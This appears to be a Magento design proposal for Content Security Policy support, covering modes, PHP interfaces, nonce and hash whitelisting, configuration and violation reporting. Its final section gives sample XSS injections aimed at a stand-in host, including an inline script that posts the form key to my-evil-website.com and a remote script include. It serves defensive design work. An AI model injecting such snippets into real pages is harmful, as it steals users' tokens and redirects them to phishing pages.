## Content Security Policies
CSP allows a server to define a list of trusted sources of static files (scripts, styles, fonts, media files etc.)
along with disabling certain unsafe HTML features like inline JavaScript. It's a powerful tool
in the fight with XSS attacks. Developers/merchants should note that CSP is not meant to be the only protection mechanism
against XSS and all the regular sanitizing/user-input validations must be implemented alongside CSP.
## Modes
CSP supports two modes:
* restrict mode `Content-Security-Policy`
* report violations mode `Content-Security-Policy-Report-Only`
 
1st one would follow defined rules and prevent certain scenarios from happening
(like not loading a font from an untrusted address).
 
Second one will only report violations
to the server but proceed as it would without these restrictions. This mode would be convenient to merchants
just adopting CSP on their existing stores to see what kind of legit resources/features they need to enable
via CSP.
## Backward compatibility
In order to remind merchants that having CSP defined is important it will be enabled by default. But since adopting it
would require manually whitelisting trusted resource/features by merchants and extension developers CSP
will be functioning in the report-only mode. This will allow us to introduce CSP in a patch release.
 
## API
At the beginning Magento would not manage all of the possible CSP policies, that's
why we need an extensible SPI to allow 3rd party developers to implement and control new
policies.
 
CSP API/SPI will consist of the following interfaces:
 
* Policy DTO. The interface has only policy ID because not all CSP policies look like _\<policy name\> \<value\> \<value\>_,
  some may consist from multiple headers and have different syntax
```php
namespace Magento\Security\Model\CSP\Data;

interface PolicyInterface
{
    //Policy ID, like 'default-src' or 'referrer'
    public function getId(): string;
}
```
 
* Policy collector, will collect policies from different sources, will be composed from multiple collectors.
```php
namespace Magento\Security\Model\CSP;

interface PolicyCollectorInterface
{
    //Keys - policy IDs.
    public function collect(PolicyInterface[] $defaultPolicies = []): PolicyInterface[];
}
```
 
* Render given policy and apply to given response object.
```php
namespace Magento\Security\Model\CSP;

interface PolicyRendererInterface
{
    public function render(PolicyInterface $policy, \Magento\Framework\App\Response\HttpInterface $response): void
}
```
 
* A violation recorded by a browser
```php
namespace Magento\Security\Model\CSP\Data;

interface ViolationInterface
{
    public function getDocumentUri(): string;
    
    public function getViolatedDirective(): string;
    
    public function getOriginalPolicy(): string;
    
    public function getReferrer(): ?string;
    
    public function getBlockedUri(): ?string;
    
    public function getSourceJsFileLine(): ?string;
    
    public function getReported(): \DateTime
}
```
 
* A repository of violations logs collected when CSP reporting is enabled
```php
namespace Magento\Security\Model\CSP;

interface ViolationsRepositoryInterface
{
    public function getList(SearchCriteriaInterface $search): ViolationSearchResultInterface;
    
    public function create(string $reportJson): void;
}
```
 
## Nonce
`script-src` and `style-src` directives allow to use _nonce_ to mark trusted _\<script\>_ and _\<style\>_ blocks which
enables us to effectively disable `unsafe-inline` except for trusted blocks which may make migration to CSP friendly
front-end easier for Magento core and merchants alike. Nonce can be used for script/style blocks containing JS/CSS but
also for the ones having `src` attribute defined. Using this mechanism merchants can whitelist external scripts with
nonce instead of having to add every external domain to the whitelist.
 
There is no way to whitelist an event handler defined via an attribute though (like _onclick_) or styles defined
with _style_ attribute that's why nonce will be
disabled by default and all `unsafe-inline` scripts/styles will be allowed. Merchants who'll be successful in getting
reed of all event handlers/styles defined using HTML attributes will be able to enable _nonce_ via configuration
and used it for whitelisting. With _nonce_ enable magento will also set `strict-dynamic` value for _script-src_ policy
to allow scripts whitelisted with _nonce_ to load other scripts. This will be crucial to allow analytics/advertisement
scripts to work since they often add a bunch of other scripts from a variety of domains when loaded.
 
It is possible to combine nonce and domain-list based whitelisting for CSP.
 
Magento will have to generate unique nonce (using _Magento\Framework\Math\Random_) for each response and developers will
be able to use a presentation layer class to render nonce to their explicit inline scripts
(similar to how form key is being added to templates). With _nonce_ enabled
_Magento\Framework\View\Page\Config\Renderer_ will add nonce to all css/js assets being added to a page. With _nonce_
disabled the presentation class used inside templates will not add nonce when called and _Renderer_ will not do it as well.
 
Additional effort will have to go to ensure proper nonce used/regenrated when page cache is enabled. It is possible to
modify cached HTML with _Varnish_ using a VMODE.
 
## Hash
Hashes can be used to allow legitimate inline scripts/styles. A legitimate _script/style_ tag's content will be used to
generate hash and specify it in headers to allow it's execution. When both `unsafe-inline` and `algo-hash`
script/style-src policies are specified only scripts/styles matching the hash will be allowed similar to nonce.
Hashes do not work for _event handlers_ nor _style attributes_.
 
Merchants will be able to enable _hash_ mode instead of _nonce_ mode to whitelist inline scripts/styles and use
origin whitelisting for external resources. They may choose to do so due to complications with page-caching nonce
introduces. As with _nonce_ merchants will have to get reed of event handlers/style attributes before enabling this mode.
`strict-dynamic` value will be added to `script-src` and `style-src` policies once _hash_ mode is enabled.
 
## Dynamic whitelisting
In order to utilize nonce/hash/origin whitelisting dynamically when including scripts/styles in _.phtml_ templates
developers will be able to call helper available via local variable that will generate appropriate tag or add remote
origin to whitelist.
 
Consider template example:
```php
<?php $csp->renderInline('script', ['type' => 'text/javascript', 'src' => 'http://other-domain.com/script.js']) ?>

<?php $csp->renderInline('style', [],
<<<style
body {
    color: green;
}
style
) ?>
```
 
How it will render in different modes:
* Origin whitelisting only:
```
Content-Security-Policy: script-src http://other-domain.com
```
```html
<script type="text/javascript" src="http://other-domain.com/script.js" />
<style>
body {
    color: green;
}
</style>
```
* nonce whitelisting
```html
<script type="text/javascript" src="http://other-domain.com/script.js" nonce="jdkhsadGHd=" />
<style nonce="jdkhsadGHd=">
body {
    color: green;
}
</style>
```
* hash whitelisting
```
Content-Security-Policy: script-src http://other-domain.com
Content-Security-Policy: style-src sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8=
```
```html
<script type="text/javascript" src="http://other-domain.com/script.js"/>
<style>
body {
    color: green;
}
</style>
```
 
It will be developers' responsibility to sanitize dynamic values inside whitelisted scripts (just as it is now).

 
## CSP configuration
Security settings like CSP should be only manageable with physical files and
CLI requiring highest level of access.
 
CSP mode will be set with a config path not appearing in the admin configuration page so merchants
would have to execute a CLI command in order to change it.
#### Merchants
Merchants without dedicated development teams should be able to manage CSP.
Configuration for policies will be stored in a config path not exposed to admin _Configuration_ page
and managed by a CLI command `security:csp:add <policy> <value> <value> --replace`.
#### Theme developers
Themes may introduce new static files on Magento pages loaded from various resource so they need a
way to add those resources to the CSP whitelist. This can be done by introducing new _.xml_ file called
_csp_whitelist.xml_ which will allow to __add__ new sources to the whitelist but not to modify existing ones.
This sources will be required to have a URL or a URI with/without a wildcard but not containing
reserved words like 'self' or just a wildcard. _nonce-\*\*\*_ sources will also be allowed to be whitelisted here for
static inline javascripts. Policies that can be configured through this file
will be limited to _*-src/form-action_ policies.
 
An example of _csp\_whitelist.xml_:
```xml
<csp_whitelist xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:magento:framework:Security/etc/csp_whitelist.xsd">
    <policies>
        <policy id="font-src">
            <values>
                <value>fonts.mywebsite.com</value>
            </values>
        </policy>
    </policies>
</csp_whitelist>
```
 
#### Extension Developers
Extension developers will be able to place _csp_whitelist.xml_ inside their modules just as theme developers. For more intricate
cases they will be able to create a custom _PolicyCollectorInterface_ implementations to edit policies in the runtime.
 
#### Per-page configuration
It should be possible to configure CSP for a single page to allow access to certain resources/features
for just that one document. To achieve this developers will be able to implement a special interface by the
controller for the page they want custom CSP for.
```php
namespace Magento\Security\Model\CSP\PolicyCollector;

interface CSPAwareActionInterface extends ActionInterface
{
    public function modifyCsp(PolicyInterface[] $appliedPolicies): PolicyInterface[];
}
```
 
Thus controllers will be able to exclude/add policies to configured CSPs.

## Reporting
Browsers can report CSP violations in both modes. Magento will provide a default endpoint to receive these reports.
Since there is no way to authenticate a genuine report and on a live store they can fill up quickly the number of
reports stored in the database will be limited to 10000 deleting old ones when the limit is reached.
 
Merchants will see new violations attention message in the admin panel.
 
![alt text](img/csp_violations.png "CSP Violations")
 
This default implementation is important since with it we'll be able to show violations directly to admins to make them
pay attention to CSP, configure policies and then enable more robust reporting.
 
Extension developers will be able to redefine default report-uri via config and implement a
custom _ViolationsRepositoryInterface_ to show them in the admin panel.
 
Violations report should be accessible through web API. Both CSP related admin pages and the web API endpoints
must require _Magento_Backend::system_ resource access.
 
###### Report-Uri.com
Another default implementation that sends reports to report-uri.com will be created in order to utilize their
intelligent CSP violations collector.
 
## Default CSP
Magento uses some JavaScript libraries but usually has them provided with Magento itself without including
them from 3rd party resources so for most cases having *-src directives with 'self' value will be enough. In some .phtmls
we set event listener via attributes and we use eval in template.js so we'd have to also allow
'unsafe-inline' and 'unsafe-eval'. Magento has integrations with multiple 3rd party services like vimeo, youtube,
google analytics and various payment systems which we must whitelist additionally.
That will be the default whitelist Magento provides out of the box packaged alongside related modules via _csp\_whitelist.xml_.
 
## Future steps
To allow merchants to use whitelisting with _nonce_ we have to get reed of event handlers via HTML attributes and
style attributes in our templates. There is no way to disable `unsafe-eval` right now since we use it for UI components and
some of the front-end libraries we employ need it (like jQuery). A strategy must be created to remove `eval()` usage
from UI components.
 
The work on refactoring templates to remove event handlers and _style_ attributes will be done after CSP is introduced
gradually. In the meanwhile Merchants will be able to employ domain-whitelisting for CSP. Extension developers will
have time to update their extension to allow both domain-whitelisting and nonce whitelisting.
 
## Types of attacks that will be prevented by CSP implementation in Magento
#### CSP with origin whitelisting only
* Forcing browser to send requests to malicious pages
```html
<img src="http://my-evil-website.com/log-user.php" />
```
* Loading malicious scripts performing complex operations
```html
<script src="http://my-evil-website.com/do-evil-stuff.js" />
```
* Spoofing content
```html
<link rel="stylesheet" src="http://my-evil-website.com/different-looking-page.css" />
<iframe src="http://my-evil-website.com/mypage" style="position: absolute" width="100%" height="100%" />
```
* Malicious links
```html
<a href="http://my-evil-website.com/my-fake-page">Click this to improve Magento performance!</a>
```
* Small (inline) scripts sending data to malicious websites
```html
<script>
    let xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://my-evil-website.com/collect-form-keys');
    xhr.send(JSON.stringify({formKey: window.FORM_KEY}));
</script>
```
 
#### CSP with nonce/hash mode enabled
All of the above plus:
* Inline small malicious scripts and styles
```html
<script>
alert('Ur hacked, gimme 100$ to paypal.me/vasia');
</script>
<img
    style="position: absolute; z-index: 99999; width: 100%; height: 100%; left: 0px; top: 0px"
    onclick="window.location.href='http://my-evil-website.com/fake-page'" />
```
